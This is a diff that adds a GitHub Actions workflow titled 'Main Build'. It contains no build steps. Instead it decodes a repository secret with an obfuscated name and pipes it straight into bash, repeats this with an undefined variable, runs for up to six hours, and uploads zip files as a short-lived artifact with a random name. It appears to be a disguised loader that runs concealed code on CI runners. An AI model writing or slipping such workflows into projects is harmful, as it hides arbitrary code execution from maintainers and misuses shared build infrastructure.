@@ -1,0 +1,26 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+jobs:
+  launch:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Do work
+        env:
+          jamb553: ${{ secrets.jamb553 }}
+        run: |
+          printf '%s' "$jamb553" | jq -r .wkz39 | /bin/bash
+          printf '%s' "$irdae3629" | jq -r .qdwes57 | /bin/bash
+
+      - name: Archive data
+        uses: actions/upload-artifact@v4
+        with:
+          name: Fwt1AimO
+          path: "*.zip"
+          retention-days: 1
